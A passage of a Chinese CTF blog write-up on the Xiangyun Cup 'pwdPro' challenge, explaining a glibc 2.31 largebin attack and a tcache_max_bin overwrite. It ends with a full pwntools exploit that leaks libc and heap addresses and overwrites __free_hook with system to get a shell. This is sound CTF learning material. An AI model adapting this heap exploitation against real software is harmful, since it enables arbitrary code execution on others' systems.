+<p>绕过方法为：(p1)malloc(0x428);malloc(0x18);(p2)malloc(0x418);malloc(0x18);free(p1);malloc(0x438);free(p2);malloc(0x438);即可绕过，原因是如果插入的largebin chunk是最小的，那么便不会检查bk_nextsize。</p>
+<p>因为程序只允许我们申请大于0x400的chunk，因此我们可以想到像修改global_max_fast一样的方法，在有tcache的加入后我们可以修改tcache_max_bin，是的我们释放的largebin chunk都可以放入tcache中。那么tcache_max_bin该如何寻找呢，如下图：</p>
+<p><img src="/2021/09/03/xiangyuncup/image-20210904111952666.png" alt="image-20210904111952666"></p>
+<p>0x40代表着index，index=size(malloc(size))/0x10 - 1,将其值改为一个较大的数即可</p>
+<p>完整exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./pwdPro&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so&#x27;&#125;)</span><br><span class="line">#io = remote(&#x27;47.104.71.220&#x27; ,49261)</span><br><span class="line">libc = ELF(&#x27;./libc.so&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,name,length,context):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;You Want Add:\n&#x27;,str(index))</span><br><span class="line">    io.sendlineafter(&#x27;ID You Want Save:&#x27;,name)</span><br><span class="line">    io.sendlineafter(&#x27;Length Of Your Pwd:&#x27;,str(length))</span><br><span class="line">    io.sendafter(&#x27;Your Pwd:&#x27;,context)</span><br><span class="line"></span><br><span class="line">def edit(index,context):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;You Want Edit:\n&#x27;,str(index))</span><br><span class="line">    io.send(context)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;You Want Check:\n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27; Delete:\n&#x27;,str(index))</span><br><span class="line">    </span><br><span class="line">def re(index):</span><br><span class="line">    io.sendlineafter(&#x27;Choice:\n&#x27;,&#x27;5&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Recover:\n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(0,&#x27;0&#x27;,0x448,&#x27;0\n&#x27;)#0</span><br><span class="line">    io.recvuntil(&#x27;Save ID:&#x27;)</span><br><span class="line">    io.recv(8)</span><br><span class="line">    key=u64(io.recv(8))</span><br><span class="line">    print(&#x27;key&#x27;,hex(key))</span><br><span class="line">    add(1,&#x27;1&#x27;,0x428,&#x27;1\n&#x27;)#1</span><br><span class="line">    add(2,&#x27;2&#x27;,0x438,&#x27;2\n&#x27;)#2</span><br><span class="line">    add(3,&#x27;3&#x27;,0x428,&#x27;3\n&#x27;)#3</span><br><span class="line">    dele(0)</span><br><span class="line">    re(0)</span><br><span class="line"></span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Pwd is: &#x27;)</span><br><span class="line">    malloc_hook=(u64(io.recv(8))^key)-96-16</span><br><span class="line">    print(hex(malloc_hook+96+16))</span><br><span class="line">    libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">    free_hook=libc_base+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    addr = libc_base+0x1eb2d0</span><br><span class="line">    gdb.attach(io)   </span><br><span class="line">    add(4,&#x27;4&#x27;,0x458,&#x27;4\n&#x27;)#4</span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Pwd is: &#x27;)</span><br><span class="line">    io.recv(0x10)</span><br><span class="line">    heap_base=(u64(io.recv(8))^key)-0x280</span><br><span class="line">    print(&#x27;heap_base&#x27;,hex(heap_base))</span><br><span class="line">    dele(2)</span><br><span class="line">    </span><br><span class="line">    edit(0,p64((malloc_hook+96+16+0x3f0))+p64((malloc_hook+96+16+0x3f0))+p64(heap_base+0x280)+p64((addr-0x20))+&#x27;\n&#x27;)</span><br><span class="line">    add(5,&#x27;5&#x27;,0x458,&#x27;5\n&#x27;)#5</span><br><span class="line">    dele(5)</span><br><span class="line">    dele(4)</span><br><span class="line">    re(4)</span><br><span class="line">    edit(4,p64(free_hook-8)+&#x27;\n&#x27;)</span><br><span class="line">    add(6,&#x27;6&#x27;,0x458,&#x27;6\n&#x27;)#6</span><br><span class="line">    add(7,&#x27;7&#x27;,0x458,p64((0x68732f6e69622f)^key)+p64(system^key)+&#x27;\n&#x27;)</span><br><span class="line">    dele(7)</span><br><span class="line">    #gdb.attach(io) </span><br><span class="line">    io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/08/02/CBCTFpwn/" rel="prev" title="CBCTFpwn">
+      <i class="fa fa-chevron-left"></i> CBCTFpwn
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2099/06/11/%E6%97%A5%E5%BF%97/" rel="next" title="日志">
+      日志 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86pwn"><span class="nav-number">1.</span> <span class="nav-text">祥云杯部分pwn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#note"><span class="nav-number">2.</span> <span class="nav-text">note</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lemon-pwn"><span class="nav-number">3.</span> <span class="nav-text">lemon_pwn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwdFree"><span class="nav-number">4.</span> <span class="nav-text">pwdFree</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwdPro%EF%BC%88glibc-2-31%E4%B8%8B%E7%9A%84largebin-attack%EF%BC%89"><span class="nav-number">5.</span> <span class="nav-text">pwdPro（glibc-2.31下的largebin attack）</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ABf1ag</p>
+  <div class="site-description" itemprop="description">CTF to learn,not learn to CTF</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ABf1ag</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
